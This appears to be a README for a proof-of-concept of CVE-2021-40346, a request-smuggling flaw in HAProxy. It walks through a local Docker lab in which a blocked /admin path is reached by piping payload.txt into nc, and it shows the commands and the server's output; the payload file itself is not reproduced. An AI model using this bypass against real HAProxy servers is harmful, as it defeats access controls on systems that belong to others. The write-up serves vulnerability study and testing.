# CVE-2021-40346
CVE-2021-40346 PoC (HAProxy HTTP Smuggling)

For educational purposes only

## Setup

```
$ docker build -t cve-2021-40346 .
$ docker run --name poc -p 8000:80 -d --rm -it cve-2021-40346
4941e9f23508b497e4cbe334a75e7cdb84c83478522ed85f48db3477f97a6fb4
```

## Test
Confirm `/admin` is denied.

```
$ curl http://localhost:8000
hello
$ curl http://localhost:8000/admin
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
```

You will not see `/admin` in the log. It means the request didn't reach the backend server since HAProxy denied it.

```
$ docker logs poc
server start at port 8000
/
```

Then, you can make sure it can be bypassed by payload.txt.

```
$ cat payload.txt | nc localhost 8000
HTTP/1.1 200 OK
content-type: text/plain
date: Wed, 08 Sep 2021 22:31:10 GMT
keep-alive: timeout=5
transfer-encoding: chunked

6
hello

0
```

You will find `/admin` in the log.

```
$ docker logs poc
server start at port 8000
/
/
/admin
```

